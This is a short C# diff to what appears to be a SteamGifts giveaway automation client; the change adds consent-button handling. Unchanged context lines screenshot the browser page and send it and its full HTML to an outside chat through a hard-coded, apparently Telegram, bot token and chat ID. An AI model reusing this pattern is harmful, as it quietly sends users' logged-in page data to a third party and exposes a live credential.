@@ -56,15 +56,27 @@ namespace SteamGifts.Client
             var page = new SteamGiftPage(_driver);
             var result = new List<Giveaway>();
             int currentPage = 1;
+
+           
             do
             {
                 _logger?.LogDebug("Loading giveaways from page {Page}", currentPage);
                 page.GoToPage(currentPage++);
 
+                
+
                 ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
                 ScreenshotSender.CaptureAndSendHtmlAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
 
                 Thread.Sleep(DefaultWaitTime);
+
+                if (page.IsConsentButtonVisible())
+                {
+                    _logger?.LogInformation("Consent button is visible, clicking it.");
+                    page.ClickConsentButtonIfExists();
+                    Thread.Sleep(DefaultWaitTime);
+                }
+
                 _logger?.LogDebug("Loaded giveaways from page {Page}", currentPage);
                 var giveaways = page.GetGiveaways();
                 Thread.Sleep(DefaultWaitTime);
